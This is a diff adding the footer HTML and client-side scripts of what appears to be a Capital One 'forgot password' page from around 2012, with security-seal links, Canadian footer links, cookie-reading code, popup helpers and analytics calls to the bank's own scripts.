+      <a id="LNKVERISIGN" onclick="Javascript:PopupWithFileMenu('https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;lang=en&amp;dn=login.capitalone.com')" href="javascript:void(0)"><img id="IMGVERISIGN" title="Verisign Logo" class="screenOnly" src="https://login.capitalone.com/resources/images/verisign_logo.gif" alt="Verisign Logo" border="0" width="104" height="56"/></a>
+      
+    <!--  <a id="LNKFDIC" href="javascript:alert('You%20are%20viewing%20our%20demo.%20This%20feature%20is%20not%20enabled%20in%20the%20demo.')"><img src="https://login.capitalone.com/resources/images/fdic_logo.gif" alt="Member FDIC Logo" title="Member FDIC Logo" name="IMGFDIC" id="IMGFDIC" border="0" width="144" height="29"></a><br>
+        <a id="LNKVERISIGN" href="javascript:alert('You%20are%20viewing%20our%20demo.%20This%20feature%20is%20not%20enabled%20in%20the%20demo.')"><img id="IMGVERISIGN" class="screenOnly" src="https://login.capitalone.com/resources/images/verisign_logo.gif" alt="Verisign Logo" title="Verisign Logo" border="0"></a> --></div>
+    </div>
+
+  </div>
+</div>
+    <!-- ******************* CANADA FOOTER ************************* -->
+    <div id="comcapitalone_footer">
+      <div class="footer_content canada">
+        <!--<div class="column">-->
+        <dl class="lob">
+          <dt id="LNKCAPITALONE">CapitalOne.ca</dt>
+          <dd>
+
+            <ul>
+              <li><a id="LNKHOME_CANADA" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.ca?LinkId=ISSO_Z_Z_Z_FOOT_F1_01_T_COF')" href="Javascript:void(0)">Home</a></li>
+              <li><a id="LNKCONTACTUS_CANADA" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.ca/canada/contact/index.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_04_T_CNTUS')" href="Javascript:void(0)" >Contact Us</a><br>
+              </li>
+            </ul>
+          </dd>
+          <dd>
+            <ul>
+
+              <li><br><span class="style3" id="LNKLEGAL" style="color:#999">Legal</span></li>
+              <li><a id="LNKPRIVACY_CANADA" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.ca/canada/caprivacy.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_02_T_PRIV')" href="Javascript:void(0)">Privacy</a></li>
+              <li><a id="LNKSECURITY_CANADA" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.ca/canada/security.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_03_T_SEC')" href="Javascript:void(0)">Security</a></li>
+              <li><a id="LNKTERMS_CANADA" onclick="javascript:PopupWithFileMenu('https://servicing.capitalone.com/C1/SelfService/TermsAndConditions.aspx?LinkId=ISSO_Z_Z_Z_FOOT_F1_05_T_TANDC')" href="Javascript:void(0)">Terms and Conditions</a></li>
+            </ul>
+          </dd>
+        </dl>
+
+        <p class="disclosure1">Capital One does not provide or guarantee and
+     is not liable for the merchandise and services of companies not
+    affiliated with Capital One that are promoted on this site.<br>
+          <br>
+          &copy; 2012 Capital One.<br>
+          Capital One is a registered trademark. <br>
+          All trademarks used herein are owned by the respective entities. <br>
+          All rights reserved. <br>
+
+          <br>
+          <br>
+        </p>
+        <!--</div>-->
+        <dl class="verisign">
+          <dd>
+            <ul>
+              <li>
+              <a id="LNKVERISIGN_CANADA" onclick="Javascript:PopupWithFileMenu('https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;lang=en&amp;dn=login.capitalone.com')" href="javascript:void(0)"><img id="IMGVERISIGN1" title="Verisign Logo" class="screenOnly" src="https://login.capitalone.com/resources/images/verisign_logo.gif" alt="Verisign Logo" border="0" width="104" height="56" /></a>
+
+              <!--<img src="https://login.capitalone.com/resources/images/verisign_logo.gif" alt="Verisign Logo" title="Verisign Logo" longdesc="Verisign Logo" width="104" height="56"></li>-->
+            </ul>
+          </dd>
+        </dl>
+        <dl class="safelock">
+          <dd>
+            <ul>
+              <li>
+             <a id="LNKSAFE_CANADA" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.ca/about-us/security/?linkid=CAN_Z_Z_UNS19_CNHOMEPG_F1_24_T_CNSEC')" href="javascript:void(0)"><img id="IMGSAFEICON" title="Safe &amp; Secure Online Guarantee" class="screenOnly" src="https://login.capitalone.com/resources/images/COOB_Security_Footer.jpg" alt="Safe &amp; Secure Online Guarantee" border="0" width="128" height="47"/></a>
+
+              <!--<a href="http://www.capitalone.ca/about-us/security/?linkid=CAN_Z_Z_UNS19_CNHOMEPG_F1_24_T_CNSEC" target="_blank"><img src="https://login.capitalone.com/resources/images/COOB_Security_Footer.jpg" alt="Safe &amp; Secure Online Guarantee" title="Safe &amp; Secure Online Guarantee" longdesc="Safe &amp; Secure Online Guarantee" width="128" height="47"></a>--></li>
+            </ul>
+          </dd>
+        </dl>
+      </div>
+    </div>
+<!--</div>-->
+    <script type="text/javascript">
+      var cntryCode = readCookie('ISSO_CNTRY_CODE'); //"CA"; //
+
+        if(cntryCode == "CA")
+        {
+            elmntID = document.getElementById("caponeFooterAuthenticated");
+            elmntID.style.display = 'none';
+            elmntID = document.getElementById("comcapitalone_footer");
+            elmntID.style.display = 'block';
+        }
+        else{
+            elmntID = document.getElementById("comcapitalone_footer");
+            elmntID.style.display = 'none';
+            elmntID = document.getElementById("caponeFooterAuthenticated");
+            elmntID.style.display = 'block';
+        }
+        function readCookie(name)
+        {
+            var nameEQ = name + "=";
+            var ca=document.cookie.split(";");
+            for(i=0;i<ca.length;i++)
+            {
+                var c = ca[i];
+                while(c.charAt(0) == ' ')
+                c=c.substring(1,c.length);
+                if(c.indexOf(nameEQ) == 0)
+                {
+                    return c.substring(nameEQ.length, c.length);
+                }
+            }
+            return null;
+        }
+function PopupWithFileMenu(pageUrl)
+{				
+	var popupAttributes = 'width=620px,height=405,left=58,top=50,screenX=0,screenY=0,status=yes,scrollbars=yes,resizable=yes,toolbar=no,menubar=yes,location=no';		
+	popupWindow = window.open(pageUrl, 'CORIPOPUP', popupAttributes);
+	popupWindow.focus();
+}
+function OpenNewPopupWindow(pageUrl)
+{
+	var popupAttributes ='left=58,top=50,screenX=0,screenY=0,width=742,height=500,status=yes,scrollbars=yes,resizable=yes,toolbar=yes,menubar=yes,location=yes';		
+	popupWindow = window.open(pageUrl, 'CORIPOPUP', popupAttributes);
+	popupWindow.focus();
+    
+}
+</script>
+
+</body>
+</html>
+</form>
+ 
+
+
+<script type="text/javascript" src="https://login.capitalone.com/resources/jscript/usage_analysis.js"></script>
+<script type="text/javascript" src="https://login.capitalone.com/resources/jscript/common.js"></script>
+<script>
+function callAnalytics(pagename,prevpagename){
+        var attributes = new Array();
+        attributes[0] = "AppName=ISSO";
+        //attributes[1] = "Referrer=https://sso.capitalone.com";
+        attributes[2] = "pn="+pagename;
+        attributes[3] = "PreviousPage="+prevpagename;        
+        var cntryCd =readCookie('ISSO_CNTRY_CODE');        
+        attributes[4] = "CountryCode="+cntryCd;        
+        appURI="/resources/jscript/null.js";
+        writeAnalytic(attributes,appURI);
+}
+</script>
+
+ <script language="javascript" type="text/javascript">
+var prevpagename =readCookie('ISSO_VS_COOKIE');
+var cntryCd =readCookie('ISSO_CNTRY_CODE');
+var currpagename = '';
+if(cntryCd=='USA'){
+    if(prevpagename=='US_Forgot_Pass_MFA_Page_1')
+        currpagename = "US_Forgot_Pass_MFA_Page_2";
+    else
+        currpagename = "US_Forgot_Pass_MFA_Page_1";
+}else{
+    if(prevpagename=='CAN_Forgot_Pass_MFA_Page_1')
+        currpagename = "CAN_Forgot_Pass_MFA_Page_2";
+    else
+        currpagename = "CAN_Forgot_Pass_MFA_Page_1";
+}
+callAnalytics(currpagename,prevpagename);
+setCookie("ISSO_VS_COOKIE",currpagename);
+</script>
+</body></html>
